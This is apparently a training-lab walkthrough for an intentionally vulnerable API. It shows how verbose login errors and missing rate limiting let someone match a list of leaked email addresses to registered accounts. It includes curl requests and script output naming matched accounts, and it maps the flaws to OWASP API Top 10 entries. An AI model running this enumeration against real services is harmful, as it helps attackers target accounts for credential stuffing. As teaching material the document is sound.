# Identify registered email addresses

A lot of valuable information has been leaked in the past by others. Attackers can easily get lists of email addresses - sometimes even with passwords - of accounts that were leaked elsewhere. Because our API returns errors messages that are too verbose and because there is no rate limiting on the `/auth/login` endpoint, attackers can easily match lists of email addresses with registered accounts. 

Here is a list of [1000 leaked email addresses](../../demos//attack-2/leaked.txt). With a bit of scripting - which I have done for you - you can easily try every email address and see what happens. The script sends the email address with password `password` to the API. Using the error message (`Wrong email address` or `Wrong password`) we can identify those email addresses that are registered with an account.

```bash
curl -X POST http://<hostname>:<port>/auth/login -H "Content-Type: application/json" -d "{\"email\":\"doesnotexist@gmail.com\",\"password\":\"password123\"}"
{"status":401,"message":"Wrong email address"}

curl -X POST http://<hostname>:<port>/auth/login -H "Content-Type: application/json" -d "{\"email\":\"overrillo0@redcross.org\",\"password\":\"password123\"}"
{"status":401,"message":"Wrong password"}
```

When we run the script we see that we've been able to match six email addresses. 

```bash
deliver haveibeenpwned ./leaked.txt
______ _____ _     _____ _   _ ___________
|  _  \  ___| |   |_   _| | | |  ___| ___ \
| | | | |__ | |     | | | | | | |__ | |_/ /
| | | |  __|| |     | | | | | |  __||    /
| |/ /| |___| |_____| |_\ \_/ / |___| |\ \
|___/ \____/\_____/\___/ \___/\____/\_| \_|


Attacking http://192.168.1.23:3333/auth/login
Dictionary has 1000 email addresses
Trying 100 batches of 10 emails

[==================================================] 100% 0.0s

Duration: 2.108 secs
Found 6 accounts

lposthill1@sbwire.com
pchampkin2@t.co
nratcliffe3@digg.com
odettmar4@salon.com
cdonnell5@desdev.cn
hhalward6@google.nl
``` 

In this example we've seen two of the [OWASP API top 10](https://owasp.org/www-project-api-security/) vulnerabilities:

- [API3-2019: Excessive Data Exposure](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa3-excessive-data-exposure.md) as there is too much information in the JWT token payload.
- [API4-2019: Lack of Resources & Rate Limiting](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa4-lack-of-resources-and-rate-limiting.md) as there is no restriction on how many times you can try to log in.
- [API7-2019: Security Misconfiguration](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa7-security-misconfiguration.md) as the error messages are too verbose and give an attacker clues about how to identify accounts. 

# Note 

- For convenience reasons I have included a script here that performs the attack for you. [Burp Suite](https://portswigger.net/burp) is a well-known application for penetration testing and provides similar featuers and much more. It has a steep learning curve, but if you are serious about penetration testing you'll want to dig into it.

- An awesome resource for checking if you own email address has every been compromised in a breach is the website [';-- Have I Been Pwned?](https://haveibeenpwned.com/).